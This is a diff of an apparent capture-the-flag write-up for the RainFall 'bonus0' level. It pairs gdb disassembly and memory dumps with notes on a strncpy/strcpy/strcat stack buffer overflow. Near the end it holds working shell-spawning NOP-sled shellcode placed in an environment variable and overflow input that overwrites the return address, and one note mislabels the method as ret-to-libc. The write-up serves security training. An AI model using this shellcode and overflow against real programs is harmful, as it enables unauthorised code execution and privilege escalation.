@@ -16,7 +16,7 @@ a
 a a
 
 ********************************************************************************
-
+There is two inputs to give.
 ********************************************************************************
 
 (gdb) info function
@@ -53,34 +53,7 @@ Non-debugging symbols:
 0x0804867c  _fini
 
 ********************************************************************************
-
-********************************************************************************
-
-(gdb) info variable
-All defined variables:
-
-Non-debugging symbols:
-0x08048698  _fp_hw
-0x0804869c  _IO_stdin_used
-0x080487f4  __FRAME_END__
-0x080497f8  __CTOR_LIST__
-0x080497f8  __init_array_end
-0x080497f8  __init_array_start
-0x080497fc  __CTOR_END__
-0x08049800  __DTOR_LIST__
-0x08049804  __DTOR_END__
-0x08049808  __JCR_END__
-0x08049808  __JCR_LIST__
-0x0804980c  _DYNAMIC
-0x080498d8  _GLOBAL_OFFSET_TABLE_
-0x08049904  __data_start
-0x08049904  data_start
-0x08049908  __dso_handle
-0x0804990c  completed.6159
-0x08049910  dtor_idx.6161
-
-********************************************************************************
-
+A call to strcpy might permit us to overwrite somewhere.
 ********************************************************************************
 
 (gdb) disas main
@@ -101,39 +74,7 @@ Dump of assembler code for function main:
 End of assembler dump.
 
 ********************************************************************************
-
-********************************************************************************
-
-(gdb) disas p
-Dump of assembler code for function p:
-   0x080484b4 <+0>:	push   %ebp
-   0x080484b5 <+1>:	mov    %esp,%ebp
-   0x080484b7 <+3>:	sub    $0x1018,%esp
-   0x080484bd <+9>:	mov    0xc(%ebp),%eax
-   0x080484c0 <+12>:	mov    %eax,(%esp)
-   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
-   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
-   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
-   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
-   0x080484da <+38>:	movl   $0x0,(%esp)
-   0x080484e1 <+45>:	call   0x8048380 <read@plt>
-   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
-   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
-   0x080484f4 <+64>:	mov    %eax,(%esp)
-   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
-   0x080484fc <+72>:	movb   $0x0,(%eax)
-   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
-   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
-   0x0804850d <+89>:	mov    %eax,0x4(%esp)
-   0x08048511 <+93>:	mov    0x8(%ebp),%eax
-   0x08048514 <+96>:	mov    %eax,(%esp)
-   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
-   0x0804851c <+104>:	leave
-   0x0804851d <+105>:	ret
-End of assembler dump.
-
-********************************************************************************
-
+The main call pp and puts the buffer we fill with pp.
 ********************************************************************************
 
 (gdb) disas pp
@@ -183,19 +124,42 @@ Dump of assembler code for function pp:
 End of assembler dump.
 
 ********************************************************************************
-
+the function pp calls p two times, strcpy and strcat and seems to do a strlen too.
+we will use the strcpy or tyhe strcat to use a buffer overflow attack.
 ********************************************************************************
 
-(gdb) run
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-
-Starting program: /home/user/bonus0/bonus0 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
-
-Breakpoint 1, 0x0804852e in pp ()
+(gdb) disas p
+Dump of assembler code for function p:
+   0x080484b4 <+0>:	push   %ebp
+   0x080484b5 <+1>:	mov    %esp,%ebp
+   0x080484b7 <+3>:	sub    $0x1018,%esp
+   0x080484bd <+9>:	mov    0xc(%ebp),%eax
+   0x080484c0 <+12>:	mov    %eax,(%esp)
+   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
+   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
+   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
+   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
+   0x080484da <+38>:	movl   $0x0,(%esp)
+   0x080484e1 <+45>:	call   0x8048380 <read@plt>
+   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
+   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
+   0x080484f4 <+64>:	mov    %eax,(%esp)
+   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
+   0x080484fc <+72>:	movb   $0x0,(%eax)
+   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
+   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
+   0x0804850d <+89>:	mov    %eax,0x4(%esp)
+   0x08048511 <+93>:	mov    0x8(%ebp),%eax
+   0x08048514 <+96>:	mov    %eax,(%esp)
+   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
+   0x0804851c <+104>:	leave
+   0x0804851d <+105>:	ret
+End of assembler dump.
 
 ********************************************************************************
-
+p read our input with a buffer of 4096o, and copy the 20 first charachter we
+input in a buffer and return it. We can use the vulnerability of strncpy to send
+a buffer without '\0' to strcpy in pp.
 ********************************************************************************
 
 bonus0@RainFall:~$ gdb bonus0
@@ -271,14 +235,76 @@ Program received signal SIGSEGV, Segmentation fault.
 0x44434343 in ?? ()
 
 ********************************************************************************
+We found the offset at 9 on the second read.
+********************************************************************************
 
+(gdb) si
+0x08048598 in pp ()
+(gdb) i r
+eax            0xbffff9c6	-1073743418
+ecx            0xffffffd2	-46
+edx            0x20	32
+ebx            0x80486a4	134514340
+esp            0xbffff950	0xbffff950
+ebp            0xbffff9a8	0xbffff9a8
+esi            0x0	0
+edi            0xbffff9f3	-1073743373
+eip            0x8048598	0x8048598 <pp+122>
+eflags         0x200292	[ AF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) x /50xw 0xbffff9c6
+0xbffff9c6:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff9d6:	0x42424242	0x41414141	0x41414141	0xfffbe141
+0xbffff9e6:	0x414141bf	0x41414141	0xb7fd0ff4	0x00000020
+0xbffff9f6:	0x00000000	0x54d30000	0x0001b7e4	0xfa940000
+0xbffffa06:	0xfa9cbfff	0xc858bfff	0x0000b7fd	0xfa1c0000
+0xbffffa16:	0xfa9cbfff	0x0000bfff	0x824c0000	0x0ff40804
+0xbffffa26:	0x0000b7fd	0x00000000	0x00000000	0xbe9a0000
+0xbffffa36:	0x9a8af152	0x0000c60f	0x00000000	0x00000000
+0xbffffa46:	0x00010000	0x84000000	0x00000804	0x26b00000
+0xbffffa56:	0x53e9b7ff	0xeff4b7e4	0x0001b7ff	0x84000000
+0xbffffa66:	0x00000804	0x84210000	0x85a40804	0x00010804
+0xbffffa76:	0xfa940000	0x85d0bfff	0x86400804	0xd2800804
+0xbffffa86:	0xfa8cb7fe	0xf918bfff
+(gdb) x /50xw $ebp-60
+0xbffff96c:	0xffffffff	0xbffff9af	0xbffff9ae	0x42424242
+0xbffff97c:	0x42424242	0x42424242	0x42424242	0x42424242
+0xbffff98c:	0x41414141	0x41414141	0xfffbe141	0x414141bf
+0xbffff99c:	0x41414141	0xb7fd0ff4	0x00000000	0xbffff9f8
+0xbffff9ac:	0x080485b9	0xbffff9c6	0x080498d8	0x00000001
+0xbffff9bc:	0x0804835d	0xb7fd13e4	0x42420016	0x42424242
+0xbffff9cc:	0x42424242	0x42424242	0x42424242	0x41414242
+0xbffff9dc:	0x41414141	0xe1414141	0x41bffffb	0x41414141
+0xbffff9ec:	0x0ff44141	0x0020b7fd	0x00000000	0x00000000
+0xbffff9fc:	0xb7e454d3	0x00000001	0xbffffa94	0xbffffa9c
+0xbffffa0c:	0xb7fdc858	0x00000000	0xbffffa1c	0xbffffa9c
+0xbffffa1c:	0x00000000	0x0804824c	0xb7fd0ff4	0x00000000
+0xbffffa2c:	0x00000000	0x00000000
+...
+(gdb) si
+0x080485cb in main ()
+(gdb) si
+Cannot access memory at address 0x41414145
+
+********************************************************************************
+We can see that strcpy didn't found a '\0' and copied our two buffer + some other
+character before finding a 0 so in the strcat the overflow will happen, our buffer
+being only 54. We see that we have overwriten the address of the return of the main.
 ********************************************************************************
 
 bonus0@RainFall:~$ python -c "print('\x90'*1000+'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')" > /tmp/payload
 
-********************************************************************************
-
-********************************************************************************
+*********************************************************************************
+We will do a ret to libc attack, to do this we need to put our shellcode in an
+environment variable, and put an address pointing to a nop's area of our
+shellcode at the end of our buffer overflow.
+We will now check where if our environment variable is in the memory.
+*******************************************************************************
 
 bonus0@RainFall:~$ env -i payload=$(cat /tmp/payload) gdb ./bonus0
 (gdb) b *main+13
@@ -311,24 +337,16 @@ Breakpoint 1, 0x080485b1 in main ()
 ...
 
 ********************************************************************************
-
+We found the nop's area, we take a random address of a nop like 0xbffffbe1.
 ********************************************************************************
 
 bonus0@RainFall:~$ python -c "print('A'*4095+'\n'+'A'*9+'\xe1\xfb\xff\xbf')" > /tmp/exploit
 
 
 ********************************************************************************
-
-********************************************************************************
-
-bonus0@RainFall:~$ cat /tmp/exploit - | env -i payload=$(cat /tmp/payload) ./bonus0
- -
- -
-BBBBBBBBBBBBBBBBBBBBAAAAAAAAA���� AAAAAAAAA����
-whoami
-
-********************************************************************************
-
+We construct our buffer overflow with the nop's address at the good offset.
+We need to put 4095 charachters and a '\n', like this we can send all the exploit
+in one time, even if there is two read.
 ********************************************************************************
 
 bonus0@RainFall:~$ python -c "print('B'*4095+'\n'+'A'*9+'\xe1\xfb\xff\xbf'+'A'*100)" > /tmp/exploit
